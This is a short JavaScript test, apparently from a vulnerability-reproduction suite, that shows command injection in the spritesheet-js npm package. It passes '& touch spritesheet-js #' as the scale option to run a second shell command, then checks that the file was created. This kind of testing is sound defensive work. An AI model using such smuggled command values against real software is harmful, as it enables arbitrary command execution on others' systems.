
test("Command Injection in spritesheet-js", () => 
{
    const a =require("spritesheet-js");
	const fs = require('fs')
	const path = './spritesheet-js'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    a('./', { scale:"& touch spritesheet-js #",trim:true});
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});